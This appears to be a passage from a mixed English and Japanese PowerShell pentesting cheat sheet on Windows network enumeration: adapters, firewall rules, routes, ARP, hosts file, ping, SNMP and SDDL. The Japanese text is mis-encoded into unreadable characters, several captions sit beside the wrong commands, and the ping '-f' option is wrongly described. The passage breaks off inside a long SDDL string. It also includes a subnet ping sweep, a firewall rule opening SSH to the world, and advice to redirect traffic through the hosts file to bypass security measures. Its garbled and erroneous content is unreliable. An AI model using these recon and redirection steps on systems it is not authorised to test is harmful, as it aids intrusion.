ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€MACã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå­˜åœ¨ã™ã‚‹ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®ã¿ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapter | Where-Object {$_.MacAddress -like '00-11-22-33-44-55'}
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€æŒ‡å®šã—ãŸMACã‚¢ãƒ‰ãƒ¬ã‚¹ã«ä¸€è‡´ã™ã‚‹ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®ã¿ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapter | Where-Object {$_.MacAddress -match '([A-Fa-f0-9]{2}-){5}[A-Fa-f0-9]{2}'}
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€æ­£è¦è¡¨ç¾ã‚’ä½¿ç”¨ã—ã¦æœ‰åŠ¹ãªMACã‚¢ãƒ‰ãƒ¬ã‚¹ã«ä¸€è‡´ã™ã‚‹ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®ã¿ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«

A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware devices or software programs.

ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã¯ã€äº‹å‰ã«è¨­å®šã•ã‚ŒãŸã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ«ãƒ¼ãƒ«ã«åŸºã¥ã„ã¦ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®é€å—ä¿¡ã‚’ç›£è¦–ãŠã‚ˆã³åˆ¶å¾¡ã™ã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‡ãƒã‚¤ã‚¹ã§ã™ã€‚ä¿¡é ¼ã•ã‚ŒãŸå†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¨ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆãªã©ã®ä¿¡é ¼ã§ããªã„å¤–éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®é–“ã«ãƒãƒªã‚¢ã‚’è¨­ã‘ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã¯ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ãƒ‡ãƒã‚¤ã‚¹ã¾ãŸã¯ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¨ã—ã¦å®Ÿè£…ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### ãƒ«ãƒ¼ãƒˆ

The term "route" refers to the path that network traffic takes from its source to its destination. In the context of pentesting, understanding the route can be crucial for identifying potential vulnerabilities and attack vectors.

In Windows, the `route` command is used to view and manipulate the IP routing table. This table contains information about the network interfaces and the routes that the operating system uses to determine where to send network traffic.

As a pentester, it is important to familiarize yourself with the `route` command in PowerShell. This will allow you to gather information about the network configuration, identify potential misconfigurations, and even redirect traffic to a different destination.

In this section, we will explore some basic PowerShell commands related to routing that can be useful for pentesters. These commands will help you gather information about the routing table, add or remove routes, and troubleshoot network connectivity issues.

Let's dive in and learn how to leverage PowerShell for route manipulation and analysis.
```powershell
route print
```
### ARP

ARPï¼ˆAddress Resolution Protocolï¼‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¨MACã‚¢ãƒ‰ãƒ¬ã‚¹ã®å¯¾å¿œé–¢ä¿‚ã‚’è§£æ±ºã™ã‚‹ãŸã‚ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚ARPã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‡ãƒã‚¤ã‚¹ãŒé€šä¿¡ã‚’è¡Œã†éš›ã«ã€å®›å…ˆã®MACã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ARPã‚­ãƒ£ãƒƒã‚·ãƒ¥ãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°ã¯ã€ARPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’æ‚ªç”¨ã—ã¦æ”»æ’ƒè€…ãŒãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ‡ãƒã‚¤ã‚¹ã®é€šä¿¡ã‚’å‚å—ã—ãŸã‚Šã€æ”¹ã–ã‚“ã—ãŸã‚Šã™ã‚‹æ‰‹æ³•ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€ARPå¿œç­”ãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã—ã¦ã€è‡ªèº«ã®MACã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä»–ã®ãƒ‡ãƒã‚¤ã‚¹ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã«é–¢é€£ä»˜ã‘ã‚‹ã“ã¨ã§ã€é€šä¿¡ã®ä¸­ç¶™å½¹ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚

ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã¯ã€ARPã‚­ãƒ£ãƒƒã‚·ãƒ¥ãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°ã®ä¸€ç¨®ã§ã‚ã‚Šã€æ”»æ’ƒè€…ãŒãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ‡ãƒã‚¤ã‚¹ã«å¯¾ã—ã¦å½ã®ARPå¿œç­”ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€é€šä¿¡ã®ä¸­ç¶™å½¹ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯é€šä¿¡ã®å†…å®¹ã‚’å‚å—ã—ãŸã‚Šã€æ”¹ã–ã‚“ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ARPæ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

- ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ‡ãƒã‚¤ã‚¹ã«ã¯ã€ä¿¡é ¼ã§ãã‚‹ARPå¿œç­”ã®ã¿ã‚’å—ã‘å…¥ã‚Œã‚‹ã‚ˆã†ã«è¨­å®šã—ã¾ã™ã€‚
- ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ‡ãƒã‚¤ã‚¹ã®ARPã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚’å®šæœŸçš„ã«ã‚¯ãƒªã‚¢ã™ã‚‹ã“ã¨ã§ã€ä¸æ­£ãªARPã‚¨ãƒ³ãƒˆãƒªã‚’å‰Šé™¤ã—ã¾ã™ã€‚
- ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ‡ãƒã‚¤ã‚¹ã«ã¯ã€ARPæ”»æ’ƒã‚’æ¤œçŸ¥ã™ã‚‹ãŸã‚ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å°å…¥ã—ã¾ã™ã€‚

ARPæ”»æ’ƒã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«ãŠã„ã¦é‡è¦ãªè„…å¨ã§ã™ã€‚é©åˆ‡ãªå¯¾ç­–ã‚’è¬›ã˜ã‚‹ã“ã¨ã§ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ‡ãƒã‚¤ã‚¹ã‚’ä¿è­·ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### ãƒ›ã‚¹ãƒˆ

The `hosts` file is a plain text file used by the operating system to map hostnames to IP addresses. It is commonly used to block or redirect certain websites or to override DNS settings. As a pentester, you can leverage the `hosts` file to redirect traffic to your own IP address for analysis or to bypass certain security measures.

To locate the `hosts` file on a Windows system, navigate to `C:\Windows\System32\drivers\etc`. You will find a file named `hosts` without an extension. Open this file using a text editor with administrative privileges.

The `hosts` file follows a simple syntax. Each line consists of an IP address followed by one or more hostnames separated by spaces or tabs. To redirect a hostname to a different IP address, simply add a new line with the desired IP address followed by the hostname.

For example, to redirect `www.example.com` to `192.168.0.1`, add the following line to the `hosts` file:

```
192.168.0.1    www.example.com
```

Save the file and the redirection will take effect immediately. Keep in mind that changes to the `hosts` file only affect the local system and will not be propagated to other devices on the network.

As a pentester, you can use the `hosts` file to redirect traffic to your own IP address for analysis or to bypass certain security measures. However, it is important to note that modifying the `hosts` file can have unintended consequences and should be done with caution.
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### ãƒ”ãƒ³

Pingã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¾ãŸã¯ãƒ›ã‚¹ãƒˆåã«å¯¾ã—ã¦ã€å¿œç­”æ™‚é–“ã¨å¯ç”¨æ€§ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®ãƒˆãƒ©ãƒ–ãƒ«ã‚·ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚„ãƒ›ã‚¹ãƒˆã®çŠ¶æ…‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«é »ç¹ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ä½¿ç”¨æ³•:

```
ping [ã‚ªãƒ—ã‚·ãƒ§ãƒ³] [ã‚¿ãƒ¼ã‚²ãƒƒãƒˆ]
```

ã‚ªãƒ—ã‚·ãƒ§ãƒ³:

- `-t`: ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¸ã®é€£ç¶šçš„ãªãƒ”ãƒ³é€ä¿¡ã‚’é–‹å§‹ã—ã¾ã™ã€‚
- `-n <å›æ•°>`: æŒ‡å®šã—ãŸå›æ•°ã ã‘ãƒ”ãƒ³é€ä¿¡ã‚’è¡Œã„ã¾ã™ã€‚
- `-l <ã‚µã‚¤ã‚º>`: ãƒ”ãƒ³ãƒ‘ã‚±ãƒƒãƒˆã®ã‚µã‚¤ã‚ºã‚’æŒ‡å®šã—ã¾ã™ã€‚
- `-f`: ãƒ”ãƒ³ãƒ‘ã‚±ãƒƒãƒˆã‚’ãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆåŒ–ã—ã¾ã™ã€‚
- `-4`: IPv4ã®ã¿ã‚’ä½¿ç”¨ã—ã¦ãƒ”ãƒ³é€ä¿¡ã‚’è¡Œã„ã¾ã™ã€‚
- `-6`: IPv6ã®ã¿ã‚’ä½¿ç”¨ã—ã¦ãƒ”ãƒ³é€ä¿¡ã‚’è¡Œã„ã¾ã™ã€‚

ä¾‹:

```
ping 192.168.0.1
```

```
ping google.com
```

```
ping -t 192.168.0.1
```

```
ping -n 5 google.com
```

```
ping -l 1000 google.com
```

```
ping -f google.com
```

```
ping -4 google.com
```

```
ping -6 google.com
```

> **æ³¨æ„**: ãƒ”ãƒ³ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ›ã‚¹ãƒˆã«å¯¾ã—ã¦æƒ…å ±ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã€è¨±å¯ã•ã‚Œã¦ã„ãªã„å ´åˆã‚„ä¸æ­£ãªç›®çš„ã§ä½¿ç”¨ã•ã‚Œã‚‹å ´åˆã¯é•æ³•ã§ã™ã€‚æ­£å½“ãªç›®çš„ã§ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

SNMPï¼ˆSimple Network Management Protocolï¼‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‡ãƒã‚¤ã‚¹ã®ç®¡ç†ã¨ç›£è¦–ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚SNMPã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ‡ãƒã‚¤ã‚¹ã®æƒ…å ±ã‚’åé›†ã—ã€ç®¡ç†è€…ã«é€šçŸ¥ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚SNMPã¯ã€ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã¨ãƒãƒãƒ¼ã‚¸ãƒ£ã®é–“ã§æƒ…å ±ã‚’äº¤æ›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

SNMPã¯ã€ãƒ‡ãƒã‚¤ã‚¹ã®çŠ¶æ…‹ã€ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã€ãŠã‚ˆã³ãã®ä»–ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã¯ã€SNMPã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ãƒ‡ãƒã‚¤ã‚¹ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã§ã‚ã‚Šã€ãƒãƒãƒ¼ã‚¸ãƒ£ã¯SNMPã‚’ä½¿ç”¨ã—ã¦ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã¨é€šä¿¡ã—ã¾ã™ã€‚

SNMPã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®æ‡¸å¿µãŒã‚ã‚‹ãŸã‚ã€é©åˆ‡ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ãŒå¿…è¦ã§ã™ã€‚ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã¨ãƒãƒãƒ¼ã‚¸ãƒ£ã®é–“ã®é€šä¿¡ã¯ã€æš—å·åŒ–ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã‚¹ãƒˆãƒªãƒ³ã‚°ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã‚‚é‡è¦ã§ã™ã€‚

SNMPã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‡ãƒã‚¤ã‚¹ã®ç®¡ç†ã¨ç›£è¦–ã«ãŠã„ã¦é‡è¦ãªå½¹å‰²ã‚’æœãŸã—ã¦ã„ã¾ã™ãŒã€æ‚ªæ„ã®ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ã‚‚ã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€SNMPã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã¯ã€é©åˆ‡ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’è¬›ã˜ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **SDDLæ–‡å­—åˆ—ã‚’èª­ã¿ã‚„ã™ã„å½¢å¼ã«å¤‰æ›ã™ã‚‹**

To convert the SDDL (Security Descriptor Definition Language) string into a readable format, you can use the `ConvertFrom-SddlString` cmdlet in PowerShell. This cmdlet allows you to parse and convert the SDDL string into an object that can be easily understood.

SDDL is a string format used to represent security descriptors in Windows. It defines the permissions and access control settings for various objects such as files, folders, and registry keys. However, the SDDL string itself can be difficult to interpret, especially for complex security descriptors.

Here's an example of how to use the `ConvertFrom-SddlString` cmdlet:

```powershell
$sddlString = "O:BAG:BAD:(A;;0x1200a9;;;WD)"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

In this example, we have a sample SDDL string representing a security descriptor. By using the `ConvertFrom-SddlString` cmdlet, we convert the SDDL string into an object and store it in the `$securityDescriptor` variable. Finally, we display the contents of the `$securityDescriptor` variable.

By converting the SDDL string into a readable format, you can easily understand the permissions and access control settings defined by the security descriptor. This can be helpful when analyzing and auditing the security of Windows systems.
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-